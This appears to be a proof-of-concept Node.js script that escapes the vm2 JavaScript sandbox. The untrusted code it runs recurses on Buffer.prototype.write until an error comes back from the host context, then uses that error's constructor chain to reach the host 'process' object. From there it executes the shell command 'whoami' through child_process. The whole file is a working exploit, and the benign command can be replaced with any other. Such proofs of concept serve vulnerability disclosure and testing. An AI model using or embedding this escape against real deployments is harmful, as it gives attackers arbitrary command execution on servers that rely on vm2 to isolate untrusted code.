"use strict";
const {VM} = require('vm2');
const untrusted = `
const f = Buffer.prototype.write;
const ft = {
        length: 10,
                utf8Write(){

                        }
                        }
                        function r(i){
                            var x = 0;
                                try{
                                        x = r(i);
                                            }catch(e){}
                                                if(typeof(x)!=='number')
                                                        return x;
                                                            if(x!==i)
                                                                    return x+1;
                                                                        try{
                                                                                f.call(ft);
                                                                                    }catch(e){
                                                                                            return e;
                                                                                                }
                                                                                                    return null;
                                                                                                    }
                                                                                                    var i=1;
                                                                                                    while(1){
                                                                                                        try{
                                                                                                                i=r(i).constructor.constructor("return process")();
                                                                                                                        break;
                                                                                                                            }catch(x){
                                                                                                                                    i++;
                                                                                                                                        }
                                                                                                                                        }
                                                                                                                                        i.mainModule.require("child_process").execSync("whoami").toString()
                                                                                                                                        `;
try{
      console.log(new VM().run(untrusted));
}catch(x){
      console.log(x);
}
